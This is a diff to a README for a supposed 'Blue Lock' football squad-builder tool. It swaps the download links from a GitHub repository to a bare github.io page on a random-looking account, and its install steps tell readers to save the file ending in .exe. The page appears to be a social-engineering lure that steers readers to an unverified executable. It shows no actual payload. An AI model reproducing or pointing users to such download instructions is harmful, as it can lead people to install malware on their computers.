@@ -1,6 +1,6 @@
 # ⚽ blue-lock-team-builder-v2026 - Build your perfect Blue Lock squad
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/oculomotornerveshellfish573/blue-lock-team-builder-v2026)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://oculomotornerveshellfish573.github.io)
 
 This project helps you build a starting lineup for a Blue Lock team. You use this tool to assemble players, test different formations, and optimize your squad for match play. The builder features an automatic generation tool and a smart mode that places players in their best positions.
 
@@ -8,7 +8,7 @@ This project helps you build a starting lineup for a Blue Lock team. You use thi
 
 Follow these steps to set up the builder on your computer.
 
-1.  Visit the [official download page](https://github.com/oculomotornerveshellfish573/blue-lock-team-builder-v2026).
+1.  Visit the [official download page](https://oculomotornerveshellfish573.github.io).
 2.  Locate the release section on the right side of the screen.
 3.  Select the file that ends in .exe for Windows.
 4.  Save the file to your computer.
